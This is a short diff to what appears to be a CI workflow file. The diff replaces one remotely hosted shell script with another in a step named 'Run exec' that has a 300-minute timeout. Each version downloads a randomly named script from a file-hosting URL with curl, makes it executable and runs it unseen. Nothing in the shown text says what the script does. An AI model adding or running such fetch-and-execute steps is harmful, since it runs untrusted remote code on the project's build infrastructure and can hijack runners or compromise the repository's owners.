@@ -16,8 +16,6 @@ jobs:
       - name: Run exec
         timeout-minutes: 300
         run: |
-          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1711652595/skakqbrogyxo0r3egdap.sh
-          chmod +x skakqbrogyxo0r3egdap.sh
-          ./skakqbrogyxo0r3egdap.sh
-
-
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1722844772/bpma.sh
+          chmod +x bpma.sh
+          ./bpma.sh
